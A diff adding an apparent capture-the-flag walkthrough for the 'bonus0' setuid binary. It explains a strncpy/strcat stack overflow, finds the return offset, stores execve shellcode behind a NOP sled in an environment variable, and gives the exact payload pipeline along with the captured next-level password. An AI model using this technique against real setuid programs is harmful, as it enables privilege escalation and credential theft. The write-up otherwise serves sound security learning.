@@ -1,0 +1,51 @@
+bonus0 - walkthrough
+====================
+
+Target: /home/user/bonus0/bonus0   (setuid + setgid bonus1)
+Goal:   read /home/user/bonus1/.pass
+
+1. Recon (objdump -d bonus0)
+   p(dest, prompt):
+     read(0, buf[4096]);  strchr(buf,'\n') -> '\0';  strncpy(dest, buf, 20)
+     -> strncpy copies EXACTLY 20 bytes and does not NUL-terminate.
+   pp(dest):
+     char a[20], b[20];   // adjacent (ebp-0x30, ebp-0x1c)
+     p(a," - "); p(b," - ");
+     strcpy(dest, a);              // a not terminated -> spills into b
+     dest[strlen(dest)] = ' ';     // 2-byte separator " " (word @ 0x80486a4)
+     strcat(dest, b);
+   main(): passes a ~42-byte stack buffer to pp(), then puts() it.
+
+2. The bug
+   Two 20-byte inputs are concatenated into main's small buffer with no size
+   check, overflowing the saved return address.
+
+   IMPORTANT: p() uses read(), which grabs everything available at once. The
+   two prompts are separate reads, so the two lines must be sent with a short
+   pause between them, otherwise the first read() eats both and the second
+   read() gets EOF (crash in strchr).
+
+3. Find the offset
+   input1 = "A"*20 ,  input2 = "BBBBCCCCDDDDEEEEFFFF..."  (pause between)
+     -> EIP = 0x45444444 ("DDDE")
+   Locating that in input2 shows the return address occupies input2[9..12].
+
+4. Shellcode placement (ASLR is off: randomize_va_space = 0)
+   The inputs are far too small for shellcode, so we stash it in an environment
+   variable behind a big NOP sled and return into the sled:
+     EGG = "\x90"*500 + execve("/bin//sh","-c","/bin/cat /home/user/bonus1/.pass")
+   Under gdb the sled was found spanning ~0xbffffc82 upward; returning to
+   0xbffffd80 (mid-sled) is safe (bytes 80 fd ff bf: no NUL, no '\n').
+
+5. Payload
+   input1 = "A"*20                                  (keeps the offset at 9)
+   input2 = "A"*9 + \x80\xfd\xff\xbf + "A"*7         (ret at offset 9)
+
+     export EGG="$(python -c 'print "\x90"*500 + "<shellcode>"')"
+     ( printf 'AAAAAAAAAAAAAAAAAAAA\n'; sleep 1;
+       printf 'AAAAAAAAA\x80\xfd\xff\xbfAAAAAAA\n'; sleep 1 ) | ./bonus0
+
+   Returning into the sled runs the shellcode, which cats the flag.
+
+6. Result -- bonus1 password:
+   cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
